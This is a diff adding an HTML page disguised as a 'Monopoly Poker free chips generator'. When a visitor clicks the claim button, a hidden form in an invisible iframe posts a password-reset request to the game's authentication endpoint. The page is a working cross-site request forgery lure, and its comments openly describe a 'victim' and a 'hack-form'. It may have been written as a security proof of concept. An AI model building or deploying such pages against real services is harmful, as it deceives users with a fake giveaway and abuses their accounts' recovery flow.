@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Monopoly Poker Free Chips</title>
+    <style>
+        body {
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255,255,255,0.2);
+            padding: 30px;
+            border-radius: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        h1 { font-size: 40px; }
+        .chips { font-size: 60px; margin: 20px; }
+        button {
+            background: gold;
+            color: black;
+            padding: 20px 40px;
+            font-size: 25px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎰 MONOPOLY POKER 🎰</h1>
+        <div class="chips">💰 💰 💰</div>
+        <h2>FREE CHIPS GENERATOR!</h2>
+        <p>Click below to get 1,000,000 free chips</p>
+        <button onclick="triggerReset()">CLAIM NOW!</button>
+        <p><small>Limited time offer - 100% working!</small></p>
+    </div>
+
+    <!-- Hidden form - victim won't see this -->
+    <iframe name="hidden-frame" style="display:none"></iframe>
+    <form id="hack-form" method="POST" 
+          action="https://auth-live.monopoly-poker.com/forgot-password"
+          target="hidden-frame" class="hidden">
+        <!-- CHANGE THIS EMAIL to test with your account first! -->
+        <input type="hidden" name="email" value="YOUR-EMAIL@test.com">
+    </form>
+
+    <script>
+        function triggerReset() {
+            // Show loading message
+            document.querySelector('button').innerHTML = 'PROCESSING...';
+            document.querySelector('button').style.background = 'orange';
+            
+            // Submit the form (triggers password reset)
+            document.getElementById('hack-form').submit();
+            
+            // Show success message
+            setTimeout(function() {
+                alert('✓ Check your email for verification!\n(You just triggered a password reset)');
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
